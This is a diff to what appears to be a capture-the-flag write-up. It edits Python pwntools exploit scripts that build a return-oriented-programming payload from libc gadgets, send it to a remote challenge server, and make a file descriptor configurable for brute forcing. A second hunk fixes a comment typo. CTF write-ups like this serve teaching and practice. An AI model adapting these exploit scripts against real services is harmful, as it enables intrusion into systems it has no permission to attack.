@@ -744,6 +744,7 @@ Exploit script :
 ```python=
 #!/usr/bin/python
 from pwn import *
+import sys
 
 host = '37.139.17.37'
 port = 1338
@@ -781,10 +782,16 @@ print ('pop_rdx : ', hex(pop_rdx))
 one_gadget += libc
 print ('one_gadget : ', hex(one_gadget))
 
-
+# Since the PIPE fd number may vary due to some environment issue, you can specify your PIPE fd number here if 6 does not work for you.
+if len(sys.argv) < 2:
+    # this would work in the origin remote server
+    fd = 6
+else:
+    # or enter a file descriptor, probably 6 to 10, here may require some brute force
+    fd = int(sys.argv[1])
 time.sleep(1)
 payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
-payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, 10, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
+payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, fd, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
 r.sendline(payload)
 
 time.sleep(1)
@@ -939,7 +946,7 @@ port = 60049
 
 r = remote(host, port)
 
-# this is too pass the PoW chal
+# this is to pass the PoW chal
 start(r)
 
 cnt = 0
